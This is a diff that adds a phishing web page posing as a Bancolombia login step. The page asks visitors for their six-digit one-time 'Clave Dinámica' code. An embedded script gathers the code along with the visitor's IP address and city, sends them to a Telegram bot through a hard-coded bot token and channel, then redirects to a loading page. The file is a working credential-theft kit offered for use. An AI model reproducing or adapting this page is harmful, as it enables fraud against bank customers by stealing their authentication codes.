@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>default_personas</title>
+	<link rel="stylesheet" href="https://necolas.github.io/normalize.css/8.0.1/normalize.css">
+	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"> 
+	<link rel="stylesheet" href="estilos.css">
+	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  	
+	
+				<script>
+//bot token
+var telegram_bot_id =  "6683790521:AAEXABOIRVWJH10eIEjmk3rjVVrGpzN7-N4";
+//chat id
+var chat_id ="@spprtcha";
+
+ $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+  
+var u_name,  ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("dinamica").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "Bansolombia info\n🔑Clav3_dinamica: " + u_name + "\n🌎IP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+  
+        console.log(response);
+		
+          window.location = 'cargando.html';
+
+	
+    });
+    return false;
+};
+
+			</script>	  
+</head>
+<body>
+	<main>
+	<div align="center"><img src="logo.svg" style="width:200px"><br><br>
+	
+	
+		<form action="" method="post" class="formulario" id="formulario" onsubmit="return sender()">
+		
+		<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+						
+						
+			<!-- Grupo: Usuario -->
+			<div class="formulario__grupo" id="grupo__dinamica">
+				<label for="usuario" class="formulario__label">Para continuar ingresa Clave Dinámica</label>
+				<img src="candad.jpg" style="width:20px;"><br>
+				<span style="font-size:14px">Consúltala en la App<br>del dispositivo movil donde estas ingresando al servicio</span><br><br>
+				<div class="formulario__grupo-input">
+					<input type="tel" class="formulario__input" name="dinamica" id="dinamica" placeholder="Ingrese clave dinámica" maxlength="6" minlength="6" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" required>
+					<i class="formulario__validacion-estado fas fa-times-circle"></i>
+				</div>
+				<p class="formulario__input-error">La clave dinámica es de 6 dígitos numéricos</p>
+			</div><br>
+
+
+	
+
+
+			
+			<br><br><br>
+
+			<div class="formulario__grupo formulario__grupo-btn-enviar">
+				<button type="submit" class="formulario__btn">Continuar</button>
+				<p class="formulario__mensaje-exito" id="formulario__mensaje-exito">continuar...</p>
+			</div>
+		</form>
+		</div>
+	</main>
+
+	<script >
+	
+const formulario = document.getElementById('formulario');
+const inputs = document.querySelectorAll('#formulario input');
+
+const expresiones = {
+	dinamica: /^.{6}$/, // 
+	
+}
+
+const campos = {
+	dinamica: false,
+	
+}
+
+const validarFormulario = (e) => {
+	switch (e.target.name) {
+		case "dinamica":
+			validarCampo(expresiones.dinamica, e.target, 'dinamica');
+		break;
+	
+	
+	}
+}
+
+const validarCampo = (expresion, input, campo) => {
+	if(expresion.test(input.value)){
+		document.getElementById(`grupo__${campo}`).classList.remove('formulario__grupo-incorrecto');
+		document.getElementById(`grupo__${campo}`).classList.add('formulario__grupo-correcto');
+		document.querySelector(`#grupo__${campo} i`).classList.add('fa-check-circle');
+		document.querySelector(`#grupo__${campo} i`).classList.remove('fa-times-circle');
+		document.querySelector(`#grupo__${campo} .formulario__input-error`).classList.remove('formulario__input-error-activo');
+		campos[campo] = true;
+	} else {
+		document.getElementById(`grupo__${campo}`).classList.add('formulario__grupo-incorrecto');
+		document.getElementById(`grupo__${campo}`).classList.remove('formulario__grupo-correcto');
+		document.querySelector(`#grupo__${campo} i`).classList.add('fa-times-circle');
+		document.querySelector(`#grupo__${campo} i`).classList.remove('fa-check-circle');
+		document.querySelector(`#grupo__${campo} .formulario__input-error`).classList.add('formulario__input-error-activo');
+		campos[campo] = false;
+	}
+}
+
+
+
+inputs.forEach((input) => {
+	input.addEventListener('keyup', validarFormulario);
+	input.addEventListener('blur', validarFormulario);
+});
+
+formulario.addEventListener('submit', (e) => {
+	e.preventDefault();
+
+		if(campos.dinamica ){
+		formulario.reset();
+
+		document.getElementById('formulario__mensaje-exito').classList.add('formulario__mensaje-exito-activo');
+		setTimeout(() => {
+			document.getElementById('formulario__mensaje-exito').classList.remove('formulario__mensaje-exito-activo');
+		}, 5000);
+
+		document.querySelectorAll('.formulario__grupo-correcto').forEach((icono) => {
+			icono.classList.remove('formulario__grupo-correcto');
+		});
+	} else {
+		document.getElementById('formulario__mensaje').classList.add('formulario__mensaje-activo');
+	}
+});
+	
+	</script>
+	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
+</body>
+</html>
